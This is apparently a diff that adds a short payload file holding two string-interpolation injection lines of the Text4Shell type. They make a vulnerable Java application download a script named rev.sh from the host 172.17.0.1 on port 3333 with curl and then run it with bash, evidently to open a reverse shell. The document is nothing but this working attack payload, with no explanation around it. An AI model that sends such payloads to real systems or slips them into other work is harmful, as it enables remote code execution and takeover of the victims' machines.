@@ -1,0 +1,5 @@
+
+${script:javascript:java.lang.Runtime.getRuntime().exec('curl -s http://172.17.0.1:3333/rev.sh -o /tmp/rev.sh')}
+${script:javascript:java.lang.Runtime.getRuntime().exec('bash /tmp/rev.sh')}
+
+
